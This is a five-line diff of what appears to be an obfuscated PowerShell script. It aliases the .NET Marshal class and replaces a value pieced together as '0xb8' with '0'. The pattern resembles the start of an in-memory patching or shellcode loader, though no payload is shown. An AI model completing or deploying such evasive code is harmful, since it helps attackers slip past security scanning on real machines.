@@ -1,5 +1,4 @@
-$soso = "0"
-$vxck = $soso+"xb8"
+$vxck = "0"
 $p = 0
 $7amada = [System.Runtime.InteropServices.Marshal]
 $ahh = @"
